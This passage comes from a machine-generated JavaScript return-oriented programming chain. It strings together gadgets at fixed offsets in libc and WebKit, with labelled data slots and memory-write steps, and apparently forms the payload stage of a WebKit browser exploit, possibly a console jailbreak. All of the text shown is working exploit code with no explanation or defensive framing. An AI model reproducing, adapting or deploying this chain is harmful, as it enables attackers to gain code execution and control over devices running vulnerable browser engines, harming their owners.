libc_base+793877, //pop rsi
ropchain+109096, //L1134
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1134:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109256, //L1139
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109224, //L1137
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109240, //L1138
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109328, //L1140
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1140:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109384, //L1142
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109464, //L1146
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1146:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1144:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1145:
db([22, 0]); // 0x16
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+109568, //L1147
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+109584, //L1148
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+109672, //L1149
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109728, //L1151
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109800, //L1153
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1153:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109856, //L1155
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1155:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1157:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109992, //L1158
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1158:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1160:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+110112, //L1163
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110096, //L1161
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1161:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1163:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110256, //L1166
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110224, //L1164
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110240, //L1165
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110328, //L1167
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110384, //L1169
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1169:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110464, //L1173
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1173:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1171:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1172:
db([23, 0]); // 0x17
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+110568, //L1174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+110584, //L1175
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+110672, //L1176
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110728, //L1178
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1178:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110800, //L1180
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110856, //L1182
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1182:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1184:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110992, //L1185
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1185:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1187:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+111112, //L1190
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111096, //L1188
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1188:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111256, //L1193
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111224, //L1191
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111240, //L1192
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111328, //L1194
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1194:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111384, //L1196
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1196:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111464, //L1200
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1200:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1198:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1199:
db([24, 0]); // 0x18
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+111568, //L1201
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+111584, //L1202
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+111672, //L1203
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1203:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111728, //L1205
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1205:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111800, //L1207
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111856, //L1209
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1209:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111944, //L1211
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1211:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1213:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112064, //L1216
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112048, //L1214
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1214:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1216:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112208, //L1219
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112176, //L1217
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112192, //L1218
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+112280, //L1220
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112336, //L1222
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1222:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112416, //L1226
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1226:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1224:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1225:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+112520, //L1227
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+112536, //L1228
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+112624, //L1229
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1229:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112680, //L1231
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1231:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112784, //L1233
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1233:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1235:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112904, //L1238
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112888, //L1236
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1236:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113048, //L1241
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113016, //L1239
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113032, //L1240
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113120, //L1242
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113176, //L1244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113256, //L1248
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1248:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1246:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1247:
db([25, 0]); // 0x19
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+113360, //L1249
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+113376, //L1250
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+113464, //L1251
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113520, //L1253
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1253:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113592, //L1255
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113648, //L1257
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1257:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1259:
webkit_base+8975893, //mov [rdi + 0x10], r8
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113784, //L1260
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1260:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1262:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+113904, //L1265
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113888, //L1263
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1263:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114048, //L1268
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114016, //L1266
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114032, //L1267
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114120, //L1269
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1269:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114176, //L1271
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1271:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114256, //L1275
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1275:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1273:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1274:
db([26, 0]); // 0x1a
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+114360, //L1276
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+114376, //L1277
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+114464, //L1278
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114520, //L1280
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1280:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114592, //L1282
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114648, //L1284
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1284:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1286:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114784, //L1287
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1287:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1289:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+114904, //L1292
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114888, //L1290
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1290:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1292:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115048, //L1295
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115016, //L1293
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115032, //L1294
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115120, //L1296
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1296:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+115176, //L1298
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
